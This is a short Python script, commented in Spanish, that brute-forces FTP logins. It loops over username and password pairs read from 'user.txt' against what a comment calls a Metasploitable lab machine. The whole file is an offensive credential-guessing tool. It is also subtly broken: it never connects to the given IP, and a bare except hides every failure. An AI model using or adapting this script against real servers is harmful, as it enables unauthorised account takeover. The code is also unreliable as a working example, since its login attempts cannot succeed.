import ftplib

def brute(ip, user, password):
    #Funcion que realiza las maniobras de fuerza bruta
    ftp = ftplib.FTP()
    try:
        ftp.login(user,password)
        ftp.quit()
        print(f'User: {user} :{password}')
    except:
        print('Fallo la autenticacion')

def main():
    ip = "192.0.0.1" #Ip de la maquina virtual de metaexploit
    users = open('user.txt', 'r')
    users = users.read().split('\n')
    passwords = users
    for user in users:
        for password in passwords:
            brute(ip,user, password)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()